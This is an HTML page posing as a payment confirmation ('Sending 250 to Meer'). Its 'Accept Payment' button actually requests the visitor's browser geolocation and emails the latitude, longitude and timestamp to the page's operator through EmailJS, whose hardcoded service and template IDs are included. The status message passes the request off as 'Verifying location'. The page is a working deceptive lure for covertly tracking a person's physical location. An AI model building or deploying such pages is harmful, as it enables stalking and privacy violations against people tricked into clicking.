<!DOCTYPE html>
<html>
<head>
  <title>Payment Confirmation</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
    button { padding: 15px 30px; font-size: 18px; cursor: pointer; }
    #status { margin-top: 20px; font-weight: bold; }
  </style>
</head>
<body>
  <h2>Sending 250 to Meer</h2>
  <button onclick="getLocation()">Accept Payment</button>
  <p id="status"></p>

  <!-- EmailJS SDK -->
  <script src="https://cdn.emailjs.com/sdk/3.2.0/email.min.js"></script>
  <script>
    // Initialize EmailJS with your public key
    emailjs.init('i7BweUs_ujM3g34jk');

    function getLocation() {
      const status = document.getElementById('status');

      if (!navigator.geolocation) {
        status.textContent = 'Geolocation is not supported by your browser.';
        return;
      }

      status.textContent = 'Verifying location...';

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;
          const date = new Date().toLocaleString();

          // Prepare the template parameters to send
          const templateParams = {
            latitude: latitude,
            longitude: longitude,
            date: date
          };

          // Send the email with location info
          emailjs.send('service_76mv2fb', 'template_5io8d5q', templateParams)
            .then(() => {
              status.textContent = 'Payment accepted. Location sent successfully.';
            }, (error) => {
              status.textContent = 'Failed to send location info. Try again later.';
              console.error('EmailJS error:', error);
            });
        },
        () => {
          status.textContent = 'Unable to retrieve your location.';
        }
      );
    }
  </script>
</body>
</html>
